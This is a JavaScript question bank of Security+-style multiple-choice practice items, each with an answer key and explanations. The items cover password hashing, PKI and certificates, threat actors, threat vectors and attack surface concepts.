{ id:"D1-045", domain:1, obj:"1.4", diff:"medium", q:"Adding a unique random value to each password before hashing it is known as:", options:["Salting","Stretching","Obfuscating","Steganography"], answer:0, explain:"<strong>Salting</strong> adds a unique random value to each password before hashing so identical passwords hash differently, defeating precomputed rainbow tables.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Stretching</b>: key stretching slows down each hash computation but does not add a unique per-password random value.</span><span class='qd'><b>Obfuscating</b>: obfuscation merely makes data harder to read and does not add a cryptographic random value before hashing.</span><span class='qd'><b>Steganography</b>: steganography hides the existence of a message inside another file and has nothing to do with password hashing.</span>" },
{ id:"D1-046", domain:1, obj:"1.4", diff:"medium", q:"Which technique deliberately makes password hashing slow and resource-intensive to resist brute-force attacks?", options:["Salting","Key stretching","Hashing collision","Tokenization"], answer:1, explain:"<strong>Key stretching</strong> uses functions like PBKDF2, bcrypt, or Argon2 to make each hashing attempt slow and resource-intensive, resisting brute force.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Salting</b>: salting prevents reuse of precomputed tables but does not itself slow down each guessing attempt.</span><span class='qd'><b>Hashing collision</b>: a hashing collision is a weakness where two inputs share a hash, not a defensive technique.</span><span class='qd'><b>Tokenization</b>: tokenization substitutes sensitive data with a token and is unrelated to slowing password hashing.</span>" },
{ id:"D1-047", domain:1, obj:"1.4", diff:"medium", q:"Which entity in a PKI is responsible for issuing and signing digital certificates?", options:["Key escrow agent","Registration authority","Certificate authority","Certificate revocation list"], answer:2, explain:"The <strong>Certificate authority</strong> issues and digitally signs certificates, vouching for the binding between a public key and an identity.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Registration authority</b>: the registration authority only verifies an applicant's identity before issuance and does not sign certificates.</span><span class='qd'><b>Certificate revocation list</b>: a CRL is a published list of revoked certificates, not an entity that issues them.</span><span class='qd'><b>Key escrow agent</b>: a key escrow agent securely stores copies of keys for recovery and does not issue certificates.</span>" },
{ id:"D1-048", domain:1, obj:"1.4", diff:"medium", q:"What is the purpose of a Certificate Revocation List (CRL)?", options:["To generate new key pairs","To encrypt session traffic","To list all valid certificates issued by a CA","To list certificates that are no longer trusted before they expire"], answer:3, explain:"A CRL exists <strong>To list certificates that are no longer trusted before they expire</strong> so relying parties know not to trust them.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>To list all valid certificates issued by a CA</b>: a CRL lists revoked certificates, not the full set of valid ones.</span><span class='qd'><b>To generate new key pairs</b>: key generation is done by the requester or CA tooling, not by a revocation list.</span><span class='qd'><b>To encrypt session traffic</b>: encrypting sessions is the job of protocols like TLS, not a revocation list.</span>" },
{ id:"D1-049", domain:1, obj:"1.4", diff:"medium", q:"Which protocol allows a client to check the revocation status of a single certificate in real time instead of downloading a full list?", options:["OCSP","LDAP","SAML","CRL"], answer:0, explain:"The <strong>OCSP</strong> (Online Certificate Status Protocol) queries the revocation status of a single certificate in real time.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>CRL</b>: a CRL requires downloading the entire list of revoked certificates rather than checking just one in real time.</span><span class='qd'><b>LDAP</b>: LDAP is a directory access protocol for querying user and resource information, not certificate revocation status.</span><span class='qd'><b>SAML</b>: SAML is a federation standard for exchanging authentication assertions, unrelated to certificate revocation checks.</span>" },
{ id:"D1-050", domain:1, obj:"1.4", diff:"hard", q:"A company wants its public web server certificate to remain valid even if the OCSP responder is temporarily unreachable, while still proving the cert is not revoked. Which solution BEST meets this need?", options:["Self-signed certificates","OCSP stapling","A longer key length","Disabling certificate checks"], answer:1, explain:"<strong>OCSP stapling</strong> lets the web server attach a recent CA-signed status response during the TLS handshake, so clients need not reach the responder themselves.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Self-signed certificates</b>: a self-signed certificate is not vetted by a trusted CA and does not solve responder availability for revocation proof.</span><span class='qd'><b>A longer key length</b>: increasing key length strengthens cryptographic security but does nothing to confirm revocation status when the responder is down.</span><span class='qd'><b>Disabling certificate checks</b>: turning off checks removes validation entirely, weakening security rather than proving the cert is not revoked.</span>" },
{ id:"D1-051", domain:1, obj:"1.4", diff:"hard", q:"An organization needs to secure many subdomains such as mail.example.com and shop.example.com under one certificate without listing each individually. Which certificate type is BEST?", options:["Root certificate","Code-signing certificate","Wildcard certificate","Self-signed certificate"], answer:2, explain:"A <strong>Wildcard certificate</strong> such as *.example.com secures all first-level subdomains under one certificate without listing each individually.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Self-signed certificate</b>: a self-signed certificate is not trusted by clients and does not address covering many subdomains.</span><span class='qd'><b>Root certificate</b>: a root certificate anchors a CA's trust chain and is not deployed on individual web servers.</span><span class='qd'><b>Code-signing certificate</b>: a code-signing certificate verifies software authorship, not subdomain web traffic.</span>" },
{ id:"D1-052", domain:1, obj:"1.4", diff:"hard", q:"A certificate must validate multiple distinct domain names, such as example.com and example.net, within a single certificate. Which certificate field or type provides this?", options:["Certificate signing request","Online Certificate Status Protocol","Wildcard certificate","Subject Alternative Name (SAN) certificate"], answer:3, explain:"A <strong>Subject Alternative Name (SAN) certificate</strong> lists multiple distinct domain names, such as example.com and example.net, within a single certificate.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Wildcard certificate</b>: a wildcard covers subdomains of one base domain, not different top-level domains.</span><span class='qd'><b>Certificate signing request</b>: a CSR is the request submitted to obtain a certificate, not a certificate covering multiple names.</span><span class='qd'><b>Online Certificate Status Protocol</b>: OCSP checks revocation status and does not bind multiple domain names into one certificate.</span>" },
{ id:"D1-053", domain:1, obj:"1.4", diff:"medium", q:"What is generated and sent to a certificate authority to request a new certificate, containing the applicant's public key and identity information?", options:["Certificate signing request","Private key","Key escrow record","Certificate revocation list"], answer:0, explain:"A <strong>Certificate signing request</strong> contains the applicant's public key and identity information and is sent to the CA to request a certificate.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Certificate revocation list</b>: a CRL lists revoked certificates and is not used to request a new one.</span><span class='qd'><b>Private key</b>: the private key is kept secret by the applicant and is never sent to the CA.</span><span class='qd'><b>Key escrow record</b>: a key escrow record is a stored backup of keys for recovery, not a certificate request.</span>" },
{ id:"D1-054", domain:1, obj:"1.4", diff:"hard", q:"An e-commerce site wants the highest level of identity assurance, displaying the verified organization's name after a rigorous vetting process. Which certificate validation level BEST meets this?", options:["Organization Validation (OV)","Extended Validation (EV)","Self-signed","Domain Validation (DV)"], answer:1, explain:"<strong>Extended Validation (EV)</strong> requires the most rigorous vetting and provides the highest identity assurance, displaying the verified organization name.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Domain Validation (DV)</b>: DV only confirms control of the domain with no organizational vetting.</span><span class='qd'><b>Organization Validation (OV)</b>: OV verifies the organization but uses a less rigorous process than EV and offers lower assurance.</span><span class='qd'><b>Self-signed</b>: a self-signed certificate involves no third-party vetting and provides no identity assurance at all.</span>" },
{ id:"D1-055", domain:1, obj:"1.4", diff:"easy", q:"What characteristic of a blockchain makes its ledger resistant to tampering?", options:["Records can be silently edited by administrators","Each block is encrypted with a single symmetric key","Each block contains the hash of the previous block","All data is stored on one central server"], answer:2, explain:"<strong>Each block contains the hash of the previous block</strong>, so altering any block invalidates every subsequent hash across the distributed ledger.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Each block is encrypted with a single symmetric key</b>: blockchain integrity comes from chained hashing, not from encrypting blocks with a shared key.</span><span class='qd'><b>All data is stored on one central server</b>: a blockchain is distributed across many nodes, and central storage would remove its tamper resistance.</span><span class='qd'><b>Records can be silently edited by administrators</b>: silent editing is the opposite of blockchain, which makes changes detectable through the hash chain.</span>" },
{ id:"D1-056", domain:1, obj:"1.4", diff:"medium", q:"Replacing sensitive data such as a credit card number with a non-sensitive substitute value that has no exploitable meaning is called:", options:["Key stretching","Steganography","Salting","Tokenization"], answer:3, explain:"<strong>Tokenization</strong> substitutes sensitive data with a meaningless token that carries no exploitable relationship to the original, mapped back only in a secure vault.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Key stretching</b>: key stretching slows password hashing and does not replace data with a substitute value.</span><span class='qd'><b>Steganography</b>: steganography hides a message inside another file rather than swapping data for a token.</span><span class='qd'><b>Salting</b>: salting adds a random value before hashing passwords and does not produce a reversible substitute value.</span>" },
{ id:"D1-057", domain:1, obj:"1.4", diff:"medium", q:"Hiding a secret message inside an image file so its very existence is concealed is an example of:", options:["Steganography","Hashing","Digital signing","Certificate pinning"], answer:0, explain:"<strong>Steganography</strong> conceals the very existence of a message by embedding it within another file such as an image.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Hashing</b>: hashing produces a one-way digest and does not hide a message inside another file.</span><span class='qd'><b>Digital signing</b>: digital signing proves authorship and integrity but does not conceal a message's existence.</span><span class='qd'><b>Certificate pinning</b>: certificate pinning ties a host to a specific certificate to prevent spoofing and has nothing to do with hiding messages.</span>" },
{ id:"D1-058", domain:1, obj:"1.4", diff:"hard", q:"A company encrypts a large database. To protect the symmetric data-encryption key itself, it encrypts that key with a separate master key stored in an HSM. The master key used to protect other keys is BEST described as a:", options:["Session key","Key encryption key (KEK)","Public key","Ephemeral key"], answer:1, explain:"A <strong>Key encryption key (KEK)</strong> is used to encrypt and protect other keys, such as the data-encryption key, and storing it in an HSM further safeguards it.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Session key</b>: a session key is a temporary symmetric key for a single session, not a master key protecting other keys.</span><span class='qd'><b>Public key</b>: a public key is the openly shared half of an asymmetric pair, not a master key wrapping data-encryption keys.</span><span class='qd'><b>Ephemeral key</b>: an ephemeral key is short-lived and discarded after use, the opposite of a long-term master key.</span>" },
{ id:"D1-059", domain:1, obj:"1.4", diff:"hard", q:"A security architect wants to ensure that compromise of a server's long-term private key cannot decrypt previously captured TLS sessions. Which property should the key exchange provide?", options:["Symmetric key reuse","Key escrow","Perfect forward secrecy","Certificate pinning"], answer:2, explain:"<strong>Perfect forward secrecy</strong> uses ephemeral session keys so past TLS sessions remain secure even if the long-term private key is later compromised.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Key escrow</b>: key escrow stores copies of keys for recovery, which would actually increase exposure of captured sessions, not protect them.</span><span class='qd'><b>Certificate pinning</b>: certificate pinning prevents certificate spoofing but does not protect previously captured sessions from a key compromise.</span><span class='qd'><b>Symmetric key reuse</b>: reusing keys means one compromised key decrypts many sessions, the opposite of forward secrecy.</span>" },
{ id:"D1-060", domain:1, obj:"1.4", diff:"medium", q:"A tamper-resistant hardware device dedicated to generating, storing, and managing cryptographic keys is known as a:", options:["Certificate Revocation List","Software key store","Trusted Platform Module residing only in firmware","Hardware Security Module (HSM)"], answer:3, explain:"A <strong>Hardware Security Module (HSM)</strong> is a dedicated, tamper-resistant device for secure generation, storage, and management of cryptographic keys.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Trusted Platform Module residing only in firmware</b>: a TPM is a chip bound to a single host for platform integrity, not a dedicated standalone device for centralized key management.</span><span class='qd'><b>Certificate Revocation List</b>: a CRL is a list of revoked certificates, not a hardware device.</span><span class='qd'><b>Software key store</b>: a software key store lacks the hardware tamper resistance that defines an HSM.</span>" }
);
SECPLUS.questions.push(
  { id:"D2-001", domain:2, obj:"2.1", diff:"easy", q:"Which threat actor type is BEST characterized by having vast financial resources, high sophistication, and the backing of a government to pursue long-term strategic objectives?", options:["Nation-state","Script kiddie","Insider threat","Hacktivist"], answer:0, explain:"<strong>Nation-state</strong> actors are well-funded, highly sophisticated, and act on behalf of a government, often running advanced persistent threat (APT) campaigns toward long-term strategic goals.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Hacktivist</b>: a hacktivist is motivated by a political or social cause and typically has limited funding, not government backing or vast resources.</span><span class='qd'><b>Script kiddie</b>: a script kiddie is unskilled and relies on tools written by others, the opposite of high sophistication and deep funding.</span><span class='qd'><b>Insider threat</b>: an insider is defined by authorized internal access, not by government sponsorship or vast external financial resources.</span>" },
  { id:"D2-002", domain:2, obj:"2.1", diff:"easy", q:"A teenager downloads a ready-made tool from a forum and uses it to launch attacks without understanding how it works. Which threat actor type does this describe?", options:["Organized crime","Script kiddie","Nation-state","Competitor"], answer:1, explain:"<strong>Script kiddie</strong> describes an unskilled attacker who uses ready-made tools and scripts written by others without understanding the underlying mechanics.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Organized crime</b>: organized crime groups are skilled, structured, and profit-focused, not novices running borrowed tools for thrills.</span><span class='qd'><b>Nation-state</b>: nation-state actors are highly sophisticated and government-backed, far beyond someone who simply downloads a forum tool.</span><span class='qd'><b>Competitor</b>: a competitor conducts corporate espionage for business advantage, which does not match a teenager experimenting with a downloaded tool.</span>" },
  { id:"D2-003", domain:2, obj:"2.1", diff:"medium", q:"A group defaces a corporation's website to protest its environmental record. Which motivation BEST describes this attack?", options:["Data exfiltration for resale","Financial gain","Philosophical or political beliefs","Espionage"], answer:2, explain:"<strong>Philosophical or political beliefs</strong> drive hacktivists, who deface sites or leak data to advance a cause such as an environmental protest rather than for profit.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Financial gain</b>: this motivation implies stealing money or extorting payment, but the attack seeks to protest, not profit.</span><span class='qd'><b>Espionage</b>: espionage involves covertly stealing secrets, whereas a public defacement is meant to be seen, not hidden.</span><span class='qd'><b>Data exfiltration for resale</b>: reselling stolen data is a financially motivated goal, but nothing here was stolen or sold.</span>" },
  { id:"D2-004", domain:2, obj:"2.1", diff:"medium", q:"An employee with legitimate access copies confidential client lists before resigning to join a competitor. Which threat actor type and attribute are present?", options:["Nation-state with high sophistication","Script kiddie with external access","External actor with low resources","Insider threat with internal access"], answer:3, explain:"<strong>Insider threat with internal access</strong> fits an employee who already holds authorized access and uses it to take confidential data, bypassing perimeter defenses.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>External actor with low resources</b>: the actor is an employee working from inside, not an outsider with no access.</span><span class='qd'><b>Nation-state with high sophistication</b>: no government sponsorship or advanced tradecraft is involved, just an employee copying files.</span><span class='qd'><b>Script kiddie with external access</b>: the person has legitimate internal access and is not an unskilled outsider using borrowed tools.</span>" },
  { id:"D2-005", domain:2, obj:"2.1", diff:"medium", q:"Which motivation is MOST associated with organized crime groups deploying ransomware?", options:["Financial gain","Ethical disclosure","Political protest","Service disruption only"], answer:0, explain:"<strong>Financial gain</strong> is the primary driver of organized crime; ransomware and extortion are designed to generate profit.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Service disruption only</b>: disruption may be a side effect, but the goal of ransomware is payment, not outage for its own sake.</span><span class='qd'><b>Ethical disclosure</b>: ethical disclosure is the goal of a researcher reporting a flaw, which is incompatible with criminal extortion.</span><span class='qd'><b>Political protest</b>: political protest is the hacktivist motivation, not the profit motive that defines organized crime.</span>" },
  { id:"D2-006", domain:2, obj:"2.1", diff:"hard", q:"A manufacturer discovers that detailed schematics of an unreleased product appeared at a rival firm. Investigation shows a sophisticated, patient intrusion lasting months with no ransom demand. Which actor and motivation are MOST likely?", options:["Script kiddie seeking notoriety","Competitor or nation-state conducting espionage","Hacktivist making a political statement","Disgruntled insider seeking revenge"], answer:1, explain:"<strong>Competitor or nation-state conducting espionage</strong> matches a long, stealthy intrusion that steals intellectual property with no ransom, the signature of espionage.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Script kiddie seeking notoriety</b>: a script kiddie lacks the skill for a months-long covert intrusion and seeks attention, not silent theft.</span><span class='qd'><b>Hacktivist making a political statement</b>: hacktivists act publicly to push a cause, not to quietly siphon product schematics over months.</span><span class='qd'><b>Disgruntled insider seeking revenge</b>: an insider already has access and would not need a sophisticated external intrusion, and revenge does not explain handing schematics to a rival.</span>" },
  { id:"D2-007", domain:2, obj:"2.1", diff:"medium", q:"Which characteristic distinguishes an 'unintentional' insider threat from a malicious one?", options:["They use advanced custom malware","They have no system access","They cause harm through error or negligence, not intent","They are always external contractors"], answer:2, explain:"<strong>They cause harm through error or negligence, not intent</strong> defines an unintentional insider, such as someone who misconfigures a system or falls for phishing without malice.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>They have no system access</b>: all insiders by definition have some authorized access, which is what makes them insiders.</span><span class='qd'><b>They are always external contractors</b>: insiders can be employees or contractors, and being external is not the defining trait of an unintentional insider.</span><span class='qd'><b>They use advanced custom malware</b>: using custom malware implies deliberate, sophisticated attack, the opposite of accidental harm.</span>" },
  { id:"D2-008", domain:2, obj:"2.1", diff:"easy", q:"What is the PRIMARY motivation typically attributed to a hacktivist?", options:["Stealing trade secrets for a competitor","Testing personal skill for fun","Financial gain","Promoting a political or social cause"], answer:3, explain:"<strong>Promoting a political or social cause</strong> is the primary hacktivist motivation, using cyberattacks as a form of activism or protest.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Financial gain</b>: profit drives organized crime, not hacktivists who act for ideology rather than money.</span><span class='qd'><b>Stealing trade secrets for a competitor</b>: this describes corporate espionage, a different motivation aimed at business advantage.</span><span class='qd'><b>Testing personal skill for fun</b>: thrill-seeking or curiosity describes some hobbyist or script-kiddie behavior, not cause-driven hacktivism.</span>" },
  { id:"D2-009", domain:2, obj:"2.1", diff:"hard", q:"A SOC analyst attributes an attack to a 'shadow IT' source. Which scenario BEST matches this attribute as a threat vector internal to the organization?", options:["An employee deploying an unsanctioned cloud app that exposes data","A nation-state APT using zero-days","A botnet launching a DDoS attack","A vendor exploiting a supply chain flaw"], answer:0, explain:"<strong>An employee deploying an unsanctioned cloud app that exposes data</strong> is shadow IT: unapproved technology stood up by staff that creates unmanaged attack surface from inside.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>A vendor exploiting a supply chain flaw</b>: this is a supply chain vector originating with a third party, not internal shadow IT.</span><span class='qd'><b>A nation-state APT using zero-days</b>: this is an external sophisticated adversary, not unsanctioned internal technology.</span><span class='qd'><b>A botnet launching a DDoS attack</b>: a DDoS is an external availability attack, unrelated to employees deploying unapproved tools.</span>" },
  { id:"D2-010", domain:2, obj:"2.1", diff:"medium", q:"Which pair correctly matches a threat actor with a typical attribute regarding resources and funding?", options:["Script kiddie - high resources/funding","Nation-state - high resources/funding","Hacktivist - always internal access","Insider - always external"], answer:1, explain:"<strong>Nation-state - high resources/funding</strong> is the only correct pairing, since government-backed actors command extensive budgets and capabilities.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Script kiddie - high resources/funding</b>: script kiddies have low resources and skill, the inverse of this claim.</span><span class='qd'><b>Hacktivist - always internal access</b>: hacktivists are typically external and their access varies, so always internal is false.</span><span class='qd'><b>Insider - always external</b>: insiders are by definition internal with authorized access, so always external is contradictory.</span>" },
  { id:"D2-011", domain:2, obj:"2.1", diff:"hard", q:"An organization faces an actor whose motivation is purely to disrupt operations and damage reputation, with no data theft or ransom. Which combination is MOST consistent?", options:["Insider seeking financial gain","Organized crime seeking financial gain","Hacktivist motivated by service disruption and revenge","Nation-state conducting espionage"], answer:2, explain:"<strong>Hacktivist motivated by service disruption and revenge</strong> fits an attack aimed purely at disruption and reputational damage with no theft or ransom.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Organized crime seeking financial gain</b>: organized crime pursues profit, but this attack demands no money.</span><span class='qd'><b>Nation-state conducting espionage</b>: espionage steals data covertly, whereas this actor steals nothing and seeks visible disruption.</span><span class='qd'><b>Insider seeking financial gain</b>: this combines an internal actor with a profit motive, neither of which matches a pure disruption campaign.</span>" },
  { id:"D2-012", domain:2, obj:"2.1", diff:"easy", q:"Which term describes an attacker who works for a criminal enterprise that operates much like a structured business with specialized roles?", options:["Hacktivist","Unintentional insider","Script kiddie","Organized crime"], answer:3, explain:"<strong>Organized crime</strong> describes a criminal enterprise structured like a business, with specialized roles, infrastructure, and a profit focus.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Script kiddie</b>: a script kiddie is a lone unskilled individual, not a structured organization with specialized roles.</span><span class='qd'><b>Hacktivist</b>: hacktivists are cause-driven and often loosely organized, not run like a profit-seeking business.</span><span class='qd'><b>Unintentional insider</b>: an unintentional insider causes accidental harm and is not part of any criminal enterprise.</span>" },
  { id:"D2-013", domain:2, obj:"2.2", diff:"easy", q:"Which of the following is the MOST common message-based threat vector used to deliver malware or steal credentials?", options:["Email","Bluetooth","Supply chain","USB drive"], answer:0, explain:"<strong>Email</strong> is the most common message-based vector, widely abused for phishing and malware delivery because of its ubiquity.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>USB drive</b>: a USB drive is a removable-device vector requiring physical media, not a message-based one.</span><span class='qd'><b>Bluetooth</b>: Bluetooth is a short-range wireless vector, not a messaging channel.</span><span class='qd'><b>Supply chain</b>: a supply chain attack compromises a trusted vendor or component, which is not a message sent to a user.</span>" },
  { id:"D2-014", domain:2, obj:"2.2", diff:"medium", q:"An attacker leaves infected USB drives in a company parking lot hoping employees will plug them in. Which threat vector category is this?", options:["Message-based vector","Removable device vector","Wireless vector","Supply chain vector"], answer:1, explain:"<strong>Removable device vector</strong> is exploited when infected USB drives are dropped for curious employees to plug in, introducing malware via physical media.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Message-based vector</b>: message vectors deliver attacks through email or text, not through dropped physical hardware.</span><span class='qd'><b>Wireless vector</b>: a wireless vector involves radio signals like Wi-Fi or Bluetooth, not a plugged-in USB stick.</span><span class='qd'><b>Supply chain vector</b>: supply chain attacks come through trusted vendors, not random drives scattered in a parking lot.</span>" },
  { id:"D2-015", domain:2, obj:"2.2", diff:"medium", q:"A vulnerability is introduced when a trusted hardware supplier ships components with pre-installed malicious firmware. Which threat vector does this represent?", options:["Default credential vector","Phishing vector","Supply chain vector","Wireless vector"], answer:2, explain:"<strong>Supply chain vector</strong> describes compromise introduced through a trusted hardware supplier shipping components with malicious firmware.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Phishing vector</b>: phishing tricks a user into acting, but here the compromise is built into delivered hardware.</span><span class='qd'><b>Wireless vector</b>: no radio interception is involved; the malware arrives pre-installed in the product.</span><span class='qd'><b>Default credential vector</b>: this involves unchanged factory logins, not malicious firmware embedded by the supplier.</span>" },
  { id:"D2-016", domain:2, obj:"2.2", diff:"medium", q:"Which scenario BEST illustrates an unsecured network as a threat vector?", options:["An encrypted VPN tunnel","A firewall with default-deny rules","A locked server room with badge access","An open wireless guest network with no segmentation from corporate resources"], answer:3, explain:"<strong>An open wireless guest network with no segmentation from corporate resources</strong> illustrates an unsecured network that lets attackers reach internal systems directly.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>A locked server room with badge access</b>: this is a strong physical control, the opposite of an unsecured network.</span><span class='qd'><b>An encrypted VPN tunnel</b>: a VPN protects traffic in transit, reducing rather than creating network exposure.</span><span class='qd'><b>A firewall with default-deny rules</b>: default-deny is a secure configuration that blocks unauthorized traffic, not an unsecured network.</span>" },
  { id:"D2-017", domain:2, obj:"2.2", diff:"hard", q:"A company's exposed RDP service on the public internet is repeatedly targeted. Which BEST describes how this expands the attack surface?", options:["An open remote-access service vector exposes authentication to brute-force and exploitation","It is only a concern for wireless clients","It eliminates the need for patching","It reduces the attack surface by centralizing access"], answer:0, explain:"<strong>An open remote-access service vector exposes authentication to brute-force and exploitation</strong> correctly describes how an internet-facing RDP service enlarges the attack surface.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>It reduces the attack surface by centralizing access</b>: exposing RDP to the internet adds an entry point, it does not shrink the attack surface.</span><span class='qd'><b>It is only a concern for wireless clients</b>: internet-exposed RDP is reachable by anyone online, not just wireless users.</span><span class='qd'><b>It eliminates the need for patching</b>: exposed services need patching more urgently, since unpatched flaws are actively targeted.</span>" },
  { id:"D2-018", domain:2, obj:"2.2", diff:"easy", q:"Which of the following is an example of a message-based threat vector other than email?", options:["Open Wi-Fi","SMS text (smishing)","USB flash drive","Vendor firmware"], answer:1, explain:"<strong>SMS text (smishing)</strong> is a message-based vector that uses text messages, alongside email, to lure victims.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>USB flash drive</b>: a USB drive is a removable-device vector, not a messaging channel.</span><span class='qd'><b>Vendor firmware</b>: malicious vendor firmware is a supply chain vector, not a message sent to a user.</span><span class='qd'><b>Open Wi-Fi</b>: open Wi-Fi is an unsecured network or wireless vector, not a message-based one.</span>" },
  { id:"D2-019", domain:2, obj:"2.2", diff:"hard", q:"An attacker exploits a misconfigured API endpoint that returns excessive data. Which attack surface concept does this MOST directly illustrate?", options:["Removable media","Physical access","Application/software attack surface via exposed interfaces","Wireless interception"], answer:2, explain:"<strong>Application/software attack surface via exposed interfaces</strong> is illustrated by a misconfigured API returning excessive data, a weakness in the software interface.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Physical access</b>: physical access concerns touching the hardware, not abusing a remote API.</span><span class='qd'><b>Wireless interception</b>: wireless interception captures radio traffic, but the flaw here is the API logic, not signal capture.</span><span class='qd'><b>Removable media</b>: removable media involves USB or disk-based delivery, unrelated to an exposed API endpoint.</span>" },
  { id:"D2-020", domain:2, obj:"2.2", diff:"medium", q:"Which threat vector is being used when an attacker connects to a system via an unpatched, internet-facing web application?", options:["Bluetooth vector","Default credential vector","Removable device vector","Vulnerable software vector"], answer:3, explain:"<strong>Vulnerable software vector</strong> is used when an attacker exploits known flaws in an unpatched, internet-facing web application.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Removable device vector</b>: this requires physical media like USB, not exploitation of an exposed application.</span><span class='qd'><b>Bluetooth vector</b>: Bluetooth is a short-range wireless attack path, not a route to a web app over the internet.</span><span class='qd'><b>Default credential vector</b>: this abuses unchanged factory passwords, whereas the scenario exploits an unpatched software flaw.</span>" },
  { id:"D2-021", domain:2, obj:"2.2", diff:"hard", q:"A penetration tester gains access by exploiting a system still configured with the manufacturer's factory login. Which threat vector is this, and why is it dangerous?", options:["Default credentials; they are publicly documented and rarely changed","Supply chain; the vendor was breached","Wireless; the signal was intercepted","Phishing; it tricks users"], answer:0, explain:"<strong>Default credentials; they are publicly documented and rarely changed</strong> correctly identifies the vector and why factory logins remain dangerous.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Phishing; it tricks users</b>: phishing manipulates a person, but here the tester simply used a known factory login, no deception involved.</span><span class='qd'><b>Supply chain; the vendor was breached</b>: nothing indicates a vendor compromise; the flaw is an unchanged default password.</span><span class='qd'><b>Wireless; the signal was intercepted</b>: no radio interception occurred; access came from the factory credentials.</span>" },
  { id:"D2-022", domain:2, obj:"2.2", diff:"medium", q:"Bluejacking and bluesnagging target which threat vector?", options:["Wired network","Wireless (Bluetooth)","Email","Supply chain"], answer:1, explain:"<strong>Wireless (Bluetooth)</strong> is the vector, since bluejacking and bluesnarfing exploit Bluetooth to send unsolicited data or steal information.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Wired network</b>: these attacks use short-range radio, not a physical cabled connection.</span><span class='qd'><b>Email</b>: email is a message-based vector and has nothing to do with Bluetooth proximity attacks.</span><span class='qd'><b>Supply chain</b>: supply chain attacks compromise trusted vendors, not nearby Bluetooth devices.</span>" },
  { id:"D2-023", domain:2, obj:"2.2", diff:"easy", q:"Which of the following BEST describes an 'attack surface'?", options:["A list of patched vulnerabilities","The encryption keys in use","The total of all points where an attacker could attempt entry","Only the company firewall"], answer:2, explain:"<strong>The total of all points where an attacker could attempt entry</strong> is the definition of the attack surface, summing every interface, service, and account exposed.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Only the company firewall</b>: the firewall is a single control, not the full set of entry points across the environment.</span><span class='qd'><b>A list of patched vulnerabilities</b>: patched flaws describe remediation status, not the breadth of exposed entry points.</span><span class='qd'><b>The encryption keys in use</b>: keys protect data confidentiality and are not a measure of exposed attack paths.</span>" },
  { id:"D2-024", domain:2, obj:"2.2", diff:"medium", q:"An organization allows employees to use personal devices that connect directly to corporate email without management controls. Which threat vector concern is MOST relevant?", options:["Reduced supply chain risk","Eliminated need for MFA","Stronger network segmentation","Unmanaged endpoints expanding the attack surface"], answer:3, explain:"<strong>Unmanaged endpoints expanding the attack surface</strong> is the key concern when personal devices connect without management controls, adding unmonitored entry points.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Reduced supply chain risk</b>: personal devices have no bearing on vendor supply chain risk and add risk rather than reducing it.</span><span class='qd'><b>Eliminated need for MFA</b>: unmanaged devices make strong authentication more important, not unnecessary.</span><span class='qd'><b>Stronger network segmentation</b>: unmanaged devices on corporate email weaken control, they do not improve segmentation.</span>" },
  { id:"D2-025", domain:2, obj:"2.3", diff:"easy", q:"Which vulnerability type occurs when a program writes more data to a memory region than it was allocated?", options:["Buffer overflow","SQL injection","Misconfiguration","Race condition"], answer:0, explain:"<strong>Buffer overflow</strong> occurs when a program writes more data than a buffer holds, overwriting adjacent memory and potentially enabling code execution.<br><span class='qwhy'>Why the other options are wrong:</span><span class='qd'><b>Race condition</b>: a race condition is a timing flaw between concurrent operations, not a memory-size violation.</span><span class='qd'><b>SQL injection</b>: SQL injection inserts malicious queries through input, it does not overflow a memory buffer.</span><span class='qd'><b>Misconfiguration</b>: a misconfiguration is an insecure setting, not a programmatic overrun of allocated memory.</span>" },
